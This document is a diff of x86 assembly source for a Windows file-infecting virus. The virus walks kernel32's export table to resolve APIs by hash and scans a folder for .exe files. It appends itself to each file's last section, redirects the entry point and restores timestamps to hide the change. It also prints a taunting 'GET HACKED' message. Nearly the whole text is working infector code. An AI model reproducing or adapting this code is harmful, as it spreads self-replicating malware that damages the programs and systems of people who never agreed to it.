@@ -1,139 +1,266 @@
 %include "io.inc"
+%include "./common.inc"
 
+%define DEBUG               1
 
-%define DEBUG           0
-
-%macro PRINT_VALUE 2
-    %if DEBUG
-        pushad
-        PRINT_STRING %1
-        PRINT_STRING ' = '
-        PRINT_HEX 4, %2
-        NEWLINE
-        popad
-    %endif
-%endmacro
-
-%macro PRINT_FILE 0 
-    %if DEBUG
-        pushad
-        mov dword[counter], 1
-        NEWLINE
-        PRINT_STRING [search + 44]
-        NEWLINE
-        popad
-    %endif
-%endmacro
-
-%macro PRINT_TRACE 0 
-    %if DEBUG 
-        pushad
-        PRINT_DEC    4, [counter]
-        PRINT_STRING ": "
-        PRINT_HEX    4, esp
-        PRINT_STRING "  "
-        PRINT_HEX    4, eax
-        NEWLINE
-        inc dword[counter]
-        popad
-    %endif
-%endmacro
-
-NULL equ                0
-virusLen equ	           end - start
-kernelAddress equ       0
-
-GetLastError equ        (6B815F70h - 6B800000h)
-GetStdHandle equ        (6B81DA70h - 6B800000h)
-WriteFile equ           (6B829D30h - 6B800000h)
-ExitProcess equ         (6B82ADB0h - 6B800000h)
-SetCurrentDirectory equ (6B838720h - 6B800000h)
-CreateFileA equ         (6B8298B0h - 6B800000h)
-FindFirstFileA equ      (6B829960h - 6B800000h)
-FindNextFileA equ       (6B8299D0h - 6B800000h)
-GetFileAttributesA equ  (6B829A90h - 6B800000h)
-SetFileAttributesA equ  (6B829CA0h - 6B800000h)
-GetFileTime equ         (6B829B00h - 6B800000h)
-GetFileSize equ         (6B829Ae0h - 6B800000h)
-CreateFileMappingA equ  (6B81A340h - 6B800000h)
-MapViewOfFile equ       (6B81C580h - 6B800000h)
-SetFileTime equ         (6B829CF0h - 6B800000h)
-CloseHandle equ         (6B829660h - 6B800000h)
-UnmapViewOfFile equ     (6B81CEC0h - 6B800000h)
-SetFilePointer equ      (6B829CD0h - 6B800000h)
-SetEndOfFile equ        (6B829C90h - 6B800000h)
+virusLen equ	            end - start
 
 global _main
 
 section .data
-    counter             dd 1
-    directory           db "C:\Assembly\Dummies\", 0
-    exestr              db "*.exe", 0
-    search times 592    db 41h
+    ; debug data
+    counter                 dd 1
+
+    ; kernel data
+    kernelAddress           dd 0
+    nFunctions              dd 0
+    functionsAddr           dd 0
+    namesAddr               dd 0
+    ordinalsAddr            dd 0
+
+    ; API method addresses
+    ExitProcess             dd 0
+    SetCurrentDirectoryA    dd 0
+    GetLastError            dd 0
+    GetStdHandle            dd 0
+    WriteFile               dd 0
+    CreateFileA             dd 0
+    FindFirstFileA          dd 0
+    FindNextFileA           dd 0
+    GetFileAttributesA      dd 0
+    SetFileAttributesA      dd 0
+    GetFileTime             dd 0
+    GetFileSize             dd 0
+    CreateFileMappingA      dd 0
+    MapViewOfFile           dd 0
+    SetFileTime             dd 0
+    CloseHandle             dd 0
+    UnmapViewOfFile         dd 0
+    SetFilePointer          dd 0
+    SetEndOfFile            dd 0
+
+    ; directory listing data
+    directory               db "C:\Assembly\Dummies\", 0
+    exestr                  db "*.exe", 0
+    search times 592        db 41h
     
-    fileAlign           dd 0
-    memoryToMap         dd 0
-    infectionFlag       dd 0
-    fileOffset          dd 0
-    fileAttributes      dd 0
-    newFileSize         dd 0
-    fileHandle          dd 0
-    fileTimesSave       dd 0
-    mapHandle           dd 0
-    mapAddress          dd 0
-    PEHeader            dd 0
-    oldEntryPoint       dd 0
-    newEntryPoint       dd 0
-    imageBase           dd 0
-    oldRawSize          dd 0
-    newRawSize          dd 0
-    incRawSize          dd 0 
-    codeSegment         dd 0
-    diskEP              dd 0
-    virusAddress        dd 0
-    virusLocation       dd 0
-    
-   
+    ; infection data
+    fileAlign               dd 0
+    memoryToMap             dd 0
+    infectionFlag           dd 0
+    fileOffset              dd 0
+    fileAttributes          dd 0
+    newFileSize             dd 0
+    fileHandle              dd 0
+    fileTimesSave           dd 0
+    mapHandle               dd 0
+    mapAddress              dd 0
+    PEHeader                dd 0
+    oldEntryPoint           dd 0
+    newEntryPoint           dd 0
+    imageBase               dd 0
+    oldRawSize              dd 0
+    newRawSize              dd 0
+    incRawSize              dd 0
+    codeSegment             dd 0
+    diskEP                  dd 0
+    virusAddress            dd 0
+    virusLocation           dd 0
+
+    ; payload data
+    overlapped              istruc OVERLAPPED
+        at offset,          dd 0xFFFFFFFF
+        at offsetHigh,      dd 0xFFFFFFFF
+    iend
+
+
 section .text
 start:
 _main:
     mov ebp, esp; for correct debugging
-  
-    ; aloocate variables on the stack
-    ;sub esp, 592        ; aloocate FIND_DATA structure
-    push 0               ; kernelAddress
 
     ; Figure out kernel32.dll's location
-    mov ebx, [FS : 0x30]    ; PEB
-    mov ebx, [ebx + 0x0C]   ; PEB->Ldr
-    mov ebx, [ebx + 0x14]   ; PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
-    mov ebx, [ebx]          ; 2nd Entry
-    mov ebx, [ebx]          ; 3rd Entry
-    mov ebx, [ebx + 0x10]   ; Third entry's base address (Kernel32.dll)
-    mov [ebp - kernelAddress] , ebx    
+    mov edi, [FS : 0x30]    ; PEB
+    mov edi, [edi + 0x0C]   ; PEB->Ldr
+    mov edi, [edi + 0x14]   ; PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
+    mov edi, [edi]          ; 2nd Entry
+    mov edi, [edi]          ; 3rd Entry
+    mov edi, [edi + 0x10]   ; Third entry's base address (Kernel32.dll)
+    mov [kernelAddress] , edi
  
- 
+    mov eax, [edi + 0x3C]   ; kernelAddress points to the DOS header, read PE RVA at 0x3C
+    add eax, edi            ; eax has the virtual address of the PE header
+    mov eax, [eax + 0x78]   ; The export table RVA is at 0x78 from the start of PE header
+    add eax, edi            ; eax has the virtual address of the export table
+    mov ecx, [eax + 0x14]   ; The number of functions is at 0x14 in the export table
+    mov [nFunctions], ecx
+    mov ecx, [eax + 0x1C]   ; RVA of array of function RVAs is at 0x1c
+    add ecx, edi            ; convert to virtual address
+    mov [functionsAddr], ecx; save
+    mov ecx, [eax + 0x20]   ; RVA of array of function name RVAs is at 0x20
+    add ecx, edi            ; convert to virtual address
+    mov [namesAddr], ecx    ; save
+    mov ecx, [eax + 0x24]   ; RVA of array of function ordinals is at 0x24
+    add ecx, edi            ; convert to virtual address
+    mov [ordinalsAddr], ecx ; save
+
+    mov ecx, [nFunctions]    ; loop counter
+    mov esi, [namesAddr]     ; iterate over array of functions names,
+                             ; which are pointers to zero-terminated strings
+loopOverNames:
+    xor edx, edx             ; edx will store the place where to put the address of the function
+    mov eax, [esi]           ; read the pointer to the name string
+    add eax, edi             ; convert to virtual address
+        push ecx
+        xor ebx, ebx  ; the hash code
+        xor ecx, ecx  ; the next character
+     hashLoop:
+        mov cl, byte [eax]
+        cmp cl, 0
+        jz hashDone
+        mov edx, ebx  ; save old hash
+        shl ebx, 5    ; multiply by 32
+        sub ebx, edx  ; subtract a hash, i.e. multiply by 31
+        add ebx, ecx  ; add the next character
+        inc eax
+        jmp hashLoop
+     hashDone:
+        pop ecx
+
+switch:
+    cmp ebx, ExitProcessHash    ; compare to the hash of the function
+    jne next1                   ; if not equal cascade down
+    lea edx, [ExitProcess]      ; if found, put the address of the appropriate memory cell in edx
+    jmp save                    ; break the switch
+next1:
+    cmp ebx, SetCurrentDirectoryAHash
+    jne next2
+    lea edx, [SetCurrentDirectoryA]
+    jmp save
+next2:
+    cmp ebx, GetLastErrorHash
+    jne next3
+    lea edx, [GetLastError]
+    jmp save
+next3:
+    cmp ebx, GetStdHandleHash
+    jne next4
+    lea edx, [GetStdHandle]
+    jmp save
+next4:
+    cmp ebx, WriteFileHash
+    jne next5
+    lea edx, [WriteFile]
+    jmp save
+next5:
+    cmp ebx, CreateFileAHash
+    jne next7
+    lea edx, [CreateFileA]
+    jmp save
+next7:
+    cmp ebx, FindFirstFileAHash
+    jne next8
+    lea edx, [FindFirstFileA]
+    jmp save
+next8:
+    cmp ebx, FindNextFileAHash
+    jne next9
+    lea edx, [FindNextFileA]
+    jmp save
+next9:
+    cmp ebx, GetFileAttributesAHash
+    jne next10
+    lea edx, [GetFileAttributesA]
+    jmp save
+next10:
+    cmp ebx, SetFileAttributesAHash
+    jne next11
+    lea edx, [SetFileAttributesA]
+    jmp save
+next11:
+    cmp ebx, GetFileTimeHash
+    jne next12
+    lea edx, [GetFileTime]
+    jmp save
+next12:
+    cmp ebx, SetFileTimeHash
+    jne next13
+    lea edx, [SetFileTime]
+    jmp save
+next13:
+    cmp ebx, GetFileSizeHash
+    jne next14
+    lea edx, [GetFileSize]
+    jmp save
+next14:
+    cmp ebx, CreateFileMappingAHash
+    jne next15
+    lea edx, [CreateFileMappingA]
+    jmp save
+next15:
+    cmp ebx, MapViewOfFileHash
+    jne next16
+    lea edx, [MapViewOfFile]
+    jmp save
+next16:
+    cmp ebx, UnmapViewOfFileHash
+    jne next17
+    lea edx, [UnmapViewOfFile]
+    jmp save
+next17:
+    cmp ebx, SetFilePointerHash
+    jne next18
+    lea edx, [SetFilePointer]
+    jmp save
+next18:
+    cmp ebx, SetEndOfFileHash
+    jne next19
+    lea edx, [SetEndOfFile]
+    jmp save
+next19:
+    cmp ebx, CloseHandleHash
+    jne next20
+    lea edx, [CloseHandle]
+    jmp save
+next20:
+
+    jmp discard
+save:
+    pusha
+    mov eax, [nFunctions]   ; compute index of function name
+    sub eax, ecx
+    shl eax, 1              ; multiply index by 2
+    add eax, [ordinalsAddr] ; compute address of ordinal
+    xor ebx, ebx
+    mov bx, word [eax]      ; read ordinal
+    shl ebx, 2              ; prepare to read function address, multiply ordinal by 4
+    add ebx, [functionsAddr]; compute address of function address
+    mov ebx, [ebx]          ; read function RVA
+    add ebx, edi            ; convert to virtual address
+    mov [edx], ebx          ; save the address
+    popa
+discard:
+    add esi, 4
+    dec ecx
+    jnz loopOverNames
+
+
+    ; Now we begin with the business of infecting some files
+
     ; SetCurrentDirectory
     lea     ebx, [directory]
     push    ebx
-    mov     ecx, SetCurrentDirectory                 ; call
-    add     ecx, [ebp - kernelAddress]
-    call    ecx 
+    call    [SetCurrentDirectoryA]
  
  
-    ; find first file   
-    ;   mov     eax, ebp
-    ;   sub     eax, 700
+    ; find first file
     lea     ebx, [search]
     push    ebx                ; Push the address of the search record
     mov     ebx, exestr        ; Point to file mask
     push    ebx                ; Push the address of file mask
-    mov     ebx, FindFirstFileA                 ; call
-    add     ebx, [ebp - kernelAddress]
-    call    ebx 
-    PRINT_FILE
+    call    [FindFirstFileA]
     cmp     eax, -1
-    mov     edi, eax        ; edi will store the file handle
+    mov     edi, eax           ; edi will store the file handle
     jz      done
     mov     esi, [search + 44]
     mov     ecx, [search + 32]
@@ -142,10 +269,8 @@ again:
     lea     ebx, [search]
     push    ebx                 ; Push the address of the search record
     mov     ecx, edi
-    push    ecx					  ; Push the file handle
-    mov     ebx, FindNextFileA                 ; call
-    add     ebx, [ebp - kernelAddress]
-    call    ebx        
+    push    ecx			; Push the file handle
+    call    [FindNextFileA]
     cmp     eax, 0
     jz      done
     PRINT_FILE
@@ -154,31 +279,25 @@ again:
     call	  InfectFile
     PRINT_TRACE
     jmp     again
+
      
-           
-     
-done:                                               
+done:
     ; hStdOut = GetstdHandle(STD_OUTPUT_HANDLE)
     push    -11
-    mov     ecx, GetStdHandle
-    add     ecx, [ebp - kernelAddress]
-    call    ecx
+    call    [GetStdHandle]
 
-    ; WriteFile( hstdOut, message, length(message), &bytes, 0);
-    push    0                       ; unused parameter
-    push    NULL                    ; &bytes
-    push    message_end - message   ; length
+    ; WriteFile( hFile, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, lpOverlapped);
+    push    overlapped                    ; lpOverlapped
+    push    NULL                    ; &lpNumberOfBytesWritten
+    push    message_end - message   ; nNumberOfBytesToWrite
     call    foo
-    
 foo:
     pop     ebx
     add     ebx, message - foo
-    push    ebx                     ; message address
-    push    eax                     ; handle to stdout
-    mov     ecx, WriteFile
-    add     ecx, [ebp - kernelAddress]
-    call    ecx 
-            
+    push    ebx                     ; lpBuffer
+    push    eax                     ; hFile
+    call    [WriteFile]
+
     jmp     exit   
     
     message:       db 'Im a virus, motherfucker!', 10, 'GET HACKED!!!', 10
@@ -187,9 +306,7 @@ foo:
 exit:     
     ; ExitProcess(0)
     push    0
-    mov     ecx, ExitProcess
-    add     ecx, [ebp - kernelAddress]
-    call    ecx
+    call    [ExitProcess]
 
 
 
@@ -216,9 +333,7 @@ InfectFile:
     mov	  [fileOffset], esi				; ESI = pointer to filename ***
     lea     ebx, [search + 44] 
     push	  ebx                         ; Address to filename
-    mov     ebx, GetFileAttributesA     ; call
-    add     ebx, [ebp - kernelAddress]
-    call    ebx                         ; Get the file attributes	
+    call    [GetFileAttributesA]                         ; Get the file attributes
     cmp	  eax, 0
     mov	  [fileAttributes], eax		
     
@@ -228,9 +343,7 @@ InfectFile:
     push	  80h                         ; 80h = FILE_ATTRIBUTE_NORMAL
     lea     ebx, [search + 44] 
     push	  ebx                         ; Address to filename
-    mov     ebx, SetFileAttributesA     ; call
-    add     ebx, [ebp - kernelAddress]
-    call    ebx                         ; Get the file attributes
+    call    [SetFileAttributesA]                         ; Get the file attributes
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; open the file                                     ;;
@@ -245,9 +358,7 @@ InfectFile:
     push	  ebx                          ; General write and read
     lea     ebx, [search + 44] 
     push	  ebx                          ; Address to filename
-    mov     ebx, CreateFileA             ; call
-    add     ebx, [ebp - kernelAddress]
-    call    ebx                          ; create the file
+    call    [CreateFileA]                          ; create the file
                                          ; EAX = file handle
  
     mov     [fileHandle], eax            ; Save file handle
@@ -267,9 +378,7 @@ InfectFile:
     add     ebx, 8
     push    ebx
     push    eax
-    mov     ebx, GetFileTime              ; call
-    add     ebx, [ebp - kernelAddress]
-    call    ebx                           ; save time fields
+    call    [GetFileTime]                           ; save time fields
     
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Now lets get the file size and save it for later  ;;
@@ -277,9 +386,7 @@ InfectFile:
     push    0						            ; Save the filesize for later
     mov     ebx, [fileHandle]
     push    ebx
-    mov     ebx, GetFileSize              ; call
-    add     ebx, [ebp - kernelAddress]
-    call    ebx                           ; save file size
+    call    [GetFileSize]                 ; save file size
     ;add    [newfilesize], eax            ; ** mov -> add
     
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -293,9 +400,7 @@ InfectFile:
     push    0                             ; Security attributes
     mov     ebx, [fileHandle]             ; File handle
     push    ebx
-    mov     ebx, CreateFileMappingA       ; call
-    add     ebx, [ebp - kernelAddress]
-    call    ebx                           ; map file to memory
+    call    [CreateFileMappingA]                           ; map file to memory
 									            ; EAX = new map handle
  
     mov     [mapHandle], eax				  ; Save map handle
@@ -312,9 +417,7 @@ InfectFile:
     push	  2						            ; File Map Write Mode
     mov     ebx, [mapHandle]              ; File Map Handle
     push    ebx
-    mov     ebx, MapViewOfFile            ; call
-    add     ebx, [ebp - kernelAddress]
-    call    ebx                           ; map file to memory
+    call    [MapViewOfFile]                           ; map file to memory
  
     cmp     eax, 0       					  ; Error ?
     je      CloseMap						  ; Cant map view of file ?
@@ -352,7 +455,7 @@ OkGo:
     mov	  eax, [esi + 3ch]			
     mov	  dword [fileAlign], eax	   ; Save File Alignment ; (EAX = File Alignment)
     PRINT_TRACE ;3
-    
+
     mov	  ebx, [esi + 74h]            ; Number of directories entries, PE + 0x74
     shl	  ebx, 3							; * 8 (size of data directories)
     add     ebx, 78h                    ; add size of COFF header
@@ -375,30 +478,30 @@ OkGo:
     add	  esi, 78h
     add	  esi, ebx
     add	  esi, eax						; ESI = Pointer to the last section header
-    
+
     PRINT_TRACE ;5
-    
+
     mov     ebx, [codeSegment]     ; pointer to raw data of code segment
     mov     eax, [ebx + 20]
     mov     ebx, [codeSegment]      ; virtual size of code segment
     add     eax, [ebx + 8]
     mov     [diskEP], eax               ; where exectuable code is (entryPoint will jump here)
-    
+
     PRINT_TRACE ;6
-    
-    mov     eax, [imageBase]            
+
+    mov     eax, [imageBase]
     add     eax, [esi + 12]
     add     eax, [esi + 8]
     mov     [virusAddress], eax
-    
+
     PRINT_TRACE ;7
-    
+
     mov     eax, [esi + 20]
     add     eax, [esi + 8]
     mov     [virusLocation], eax
-    
+
     PRINT_TRACE ;8
-        
+
     pop	  ebx                         ; restore old peheader into ebx
  
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -494,7 +597,7 @@ OkGo:
     ;add     eax, [esi + 16] 				; Add rawsize of section
     ;sub     eax, virusLen					; Subtract the virus size from it
     ;add     eax, [mapAddress]				; Align in memory to map address
-    
+
     mov     eax, [diskEP]				; Align in memory to map address
     add     eax, [mapAddress]
     mov     [eax], byte 0xBB
@@ -510,16 +613,16 @@ OkGo:
     mov     ecx, virusLen					; Number of bytes to copy
     rep     movsb							; Copy all the bytes
     PRINT_TRACE ;15
-    
+
     mov     eax, virusLen
     PRINT_VALUE "virusLen", eax
     add     eax, [virusLocation]
     PRINT_VALUE "virusLen", eax
     add     eax, [mapAddress]
     PRINT_VALUE "virusLen", eax
-    
+
     PRINT_TRACE ;16
-    
+
     mov     ebx, [imageBase]
     add     ebx, [oldEntryPoint]
     mov     [eax], byte 0xBB
@@ -539,9 +642,9 @@ OkGo:
     mov     eax, [newEntryPoint]			; Get value of new EIP in EAX
     PRINT_TRACE ;19
     mov     [esi + 28h], eax				; Write it to the PE header
-    
+
     PRINT_TRACE ;20
- 
+
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Now, lets mark the file as infected               ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -552,17 +655,13 @@ OkGo:
 UnmapView:
     mov	  ebx, [mapAddress]
     push    ebx
-    mov     ecx, UnmapViewOfFile
-    add     ecx, [ebp - kernelAddress]
-    call    ecx
+    call    [UnmapViewOfFile]
     PRINT_TRACE
     
 CloseMap:
     mov     ebx, [mapHandle]
     push    ebx
-    mov     ebx, CloseHandle
-    add     ebx, [ebp - kernelAddress]
-    call    ebx 
+    call    [CloseHandle]
     PRINT_TRACE
     
 CloseFile:
@@ -574,9 +673,7 @@ CloseFile:
     push	  ebx
     mov     ebx, [fileHandle]
     push    ebx
-    mov     ebx, SetFileTime
-    add     ebx, [ebp - kernelAddress]
-    call    ebx 
+    call    [SetFileTime]
     PRINT_TRACE
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; In order to properly close the file we must set   ;;
@@ -589,25 +686,19 @@ CloseFile:
     push    ebx
     mov     ebx, [fileHandle]
     push    ebx
-    mov     ebx, SetFilePointer
-    add     ebx, [ebp - kernelAddress]
-    call    ebx 
+    call    [SetFilePointer]
     PRINT_TRACE
  
     mov     ebx, [fileHandle]
     push    ebx
-    mov     ebx, SetEndOfFile
-    add     ebx, [ebp - kernelAddress]
-    call    ebx 
+    call    [SetEndOfFile]
     PRINT_TRACE
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; And finaly we close the file                      ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
     mov     ebx, [fileHandle]
     push    ebx
-    mov     ebx, CloseHandle
-    add     ebx, [ebp - kernelAddress]
-    call    ebx 
+    call    [CloseHandle]
     PRINT_TRACE
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;; Then we must restore file attributes              ;;
@@ -616,16 +707,12 @@ CloseFile:
     push    ebx
     lea     ebx, [search + 44]
     push    ebx                ; Push the address of the search record
-    mov     ebx, SetFileAttributesA
-    add     ebx, [ebp - kernelAddress]
     PRINT_TRACE
-    call    ebx 
+    call    [SetFileAttributesA]
     PRINT_TRACE
-    
-    ;mov     ebx, GetLastError
-    ;add     ebx, [ebp - kernelAddress]
+
     ;PRINT_TRACE
-    ;call    ebx 
+    ;call    [GetLastError]
 
     jmp     InfectionSuccessful
     
